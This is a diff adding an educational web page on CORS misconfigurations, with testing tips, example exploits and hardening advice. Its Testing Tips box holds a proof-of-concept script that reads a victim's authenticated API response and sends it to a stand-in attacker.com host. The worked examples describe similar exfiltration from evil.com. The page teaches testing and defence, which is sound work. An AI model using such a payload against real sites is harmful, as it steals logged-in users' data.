@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CORS (Cross-Origin Resource Sharing)</title>
+  <link rel="stylesheet" href="https://myfirstorlastname.github.io/whoami/style.css" />
+</head>
+<body>
+  <div id="toc-container"></div>
+  
+  <h1>🌐 CORS — Cross-Origin Resource Sharing</h1>
+  <blockquote>Cross-domain trust is a privilege, not a default. Configure it like a firewall.</blockquote>
+  <hr>
+
+  <h2>🧠 About</h2>
+  <p>
+    CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls when a web page can request
+    resources from a different origin (domain, protocol, or port). It enables modern app architectures — but
+    <strong>misconfiguration</strong> can allow attackers to read sensitive data cross-origin or act as an authenticated user.
+  </p>
+
+  <h2>📚 What is CORS, really?</h2>
+  <p>
+    Browsers enforce the Same-Origin Policy (SOP): a page can generally only read responses from the same origin.
+    CORS is a set of HTTP headers that lets a server say, <em>“this other origin is allowed to read my responses.”</em>
+  </p>
+  <ul>
+    <li><code>Access-Control-Allow-Origin</code> — which origins may read the response</li>
+    <li><code>Access-Control-Allow-Credentials</code> — whether cookies/credentials may accompany the request</li>
+    <li><code>Access-Control-Allow-Methods</code> / <code>Allow-Headers</code> — which verbs/headers are allowed</li>
+    <li>Preflight requests (<code>OPTIONS</code>) — browser asks permission before sending the “real” request</li>
+  </ul>
+
+  <h2>🔍 How CORS Vulnerabilities Happen</h2>
+  <p>
+    Servers incorrectly trust origins or reflect the request’s <code>Origin</code> header without proper validation.
+    If the victim is logged in and the site allows credentials, an attacker-controlled site can:
+  </p>
+  <ul>
+    <li>Send cross-origin requests from the victim’s browser</li>
+    <li>Receive the sensitive response (if CORS policy allows reading it)</li>
+  </ul>
+
+  <h2>🧨 Common Misconfigurations</h2>
+  <table>
+    <thead>
+      <tr><th>Pattern</th><th>Description</th><th>Risk</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Origin reflection</strong></td>
+        <td>Server echoes the <code>Origin</code> header as <code>Access-Control-Allow-Origin</code> without whitelist.</td>
+        <td>Any attacker origin can read authenticated responses.</td>
+      </tr>
+      <tr>
+        <td><strong>Wildcard + credentials</strong></td>
+        <td><code>Access-Control-Allow-Origin: *</code> with <code>Allow-Credentials: true</code> (or logic equivalent).</td>
+        <td>Browsers block this exact combo, but <em>logic bugs</em> can recreate it (e.g., multiple headers/paths).</td>
+      </tr>
+      <tr>
+        <td><strong>Trusting <code>null</code> origin</strong></td>
+        <td>Server allows <code>Origin: null</code> (sandboxed iframes, local files).</td>
+        <td>Attacker can force <code>null</code> and read sensitive data.</td>
+      </tr>
+      <tr>
+        <td><strong>Insecure schemes</strong></td>
+        <td>Whitelist <code>http://</code> origins for sensitive APIs served over <code>https://</code>.</td>
+        <td>Mixed-content weaknesses; attacker-controlled HTTP can be abused.</td>
+      </tr>
+      <tr>
+        <td><strong>Weak subdomain checks</strong></td>
+        <td>Naive string match (e.g., endsWith) trusts <code>evil-example.com</code> for <code>example.com</code>.</td>
+        <td>Bypass whitelist; read victim data via lookalike domains.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="takeaway-box">
+    <h3>🧠 Key Takeaways</h3>
+    <ul>
+      <li>CORS doesn’t send data to attackers — <em>it allows the browser to share it with allowed origins</em>.</li>
+      <li>Impact requires two things: a logged-in victim and a response that the attacker-origin can read.</li>
+      <li>Misconfigured <code>Allow-Origin</code> + <code>Allow-Credentials</code> often leads to data leakage.</li>
+      <li>Whitelisting logic is the usual weak point. Treat it like auth: verify precisely.</li>
+    </ul>
+  </div>
+
+  <div class="tips-box">
+    <h3>🔧 Testing Tips</h3>
+    <ul>
+      <li>Send requests with a custom <code>Origin</code> you control: <code>https://attacker.com</code>, <code>https://sub.attacker.com</code>, <code>null</code>.</li>
+      <li>Check if the response includes <code>Access-Control-Allow-Origin: <em>your origin</em></code> and <code>Allow-Credentials: true</code>.</li>
+      <li>Use a simple POC in your attacker origin:
+        <pre><code>&lt;script&gt;
+fetch("https://victim.com/api/account", {credentials:"include"})
+ .then(r =&gt; r.text())
+ .then(d =&gt; fetch("https://attacker.com/log?d="+encodeURIComponent(d)));
+&lt;/script&gt;</code></pre>
+      </li>
+      <li>Probe preflights by adding non-simple headers (e.g., <code>X-Test: 1</code>) and methods (<code>PUT</code>, <code>DELETE</code>).</li>
+    </ul>
+  </div>
+
+  <h2>🧪 Practical Examples (PortSwigger-style)</h2>
+
+  <h3>1) Basic Origin Reflection</h3>
+  <p><strong>Server bug:</strong> Reflects any <code>Origin</code> value back in <code>Access-Control-Allow-Origin</code>.<br>
+     <strong>Exploit:</strong> Host JS on <code>https://evil.com</code> to fetch <code>https://victim.com/api/me</code> with <code>credentials: "include"</code>. If response is readable, exfiltrate data.</p>
+
+  <h3>2) Trusted <code>null</code> Origin</h3>
+  <p><strong>Server bug:</strong> Whitelists <code>null</code> origin (common with sandboxed iframes / local files).<br>
+     <strong>Exploit:</strong> Load victim endpoint within a sandboxed iframe that sets <code>Origin: null</code>, then read response via attacker page.</p>
+
+  <h3>3) Trusted Insecure Protocols</h3>
+  <p><strong>Server bug:</strong> Whitelists <code>http://partner.example.com</code> for sensitive APIs.<br>
+     <strong>Exploit:</strong> Control that HTTP origin (or hijack via network) to read HTTPS-only data exposed via permissive CORS.</p>
+
+  <h2>🧬 CORS in Real-World Attack Chains</h2>
+  <p>
+    CORS misconfigurations become impactful when combined with session cookies and sensitive endpoints.
+    Think like an attacker: <em>Which authenticated API responses can I read cross-origin?</em>
+  </p>
+  <ul>
+    <li><strong>Account data leakage:</strong> Read profile, order history, PII from <code>/api/me</code> or <code>/api/orders</code>.</li>
+    <li><strong>Token harvest:</strong> Read CSRF or API tokens embedded in responses.</li>
+    <li><strong>Privilege escalation:</strong> If admin is tricked to visit attacker origin, read admin-only APIs.</li>
+    <li><strong>XSS + CORS:</strong> Use XSS to relax CORS client-side or exfiltrate data via crafted <code>fetch()</code> calls.</li>
+  </ul>
+
+  <h2>🔒 Prevention & Hardening</h2>
+  <ul>
+    <li><strong>Strict whitelists:</strong> Exact-match trusted origins; never reflect arbitrary <code>Origin</code>.</li>
+    <li><strong>No wildcard with credentials:</strong> Do not combine <code>Allow-Origin: *</code> with credentialed requests.</li>
+    <li><strong>Prefer HTTPS origins only:</strong> Don’t trust <code>http://</code> for sensitive endpoints.</li>
+    <li><strong>Separate public vs. private APIs:</strong> Public data can use permissive CORS; authenticated APIs must be strict.</li>
+    <li><strong>Defense-in-depth:</strong> AuthZ on every sensitive endpoint; don’t rely on CORS to protect data.</li>
+  </ul>
+
+  <h2>🛠️ Tools</h2>
+  <ul>
+    <li>Burp Suite (Proxy + Repeater) to modify <code>Origin</code> and observe headers</li>
+    <li>Browser DevTools (Network tab) to inspect CORS errors and preflights</li>
+    <li>Small attacker pages to test readable responses via <code>fetch(..., { credentials: "include" })</code></li>
+  </ul>
+
+  <hr />
+
+  <footer>
+    Treat CORS like perimeter policy for your data. Be explicit, be narrow, and assume an attacker can host any origin they want.
+  </footer>
+  <script src="https://myfirstorlastname.github.io/whoami/call_for_toc.js"></script>
+</body>
+</html>
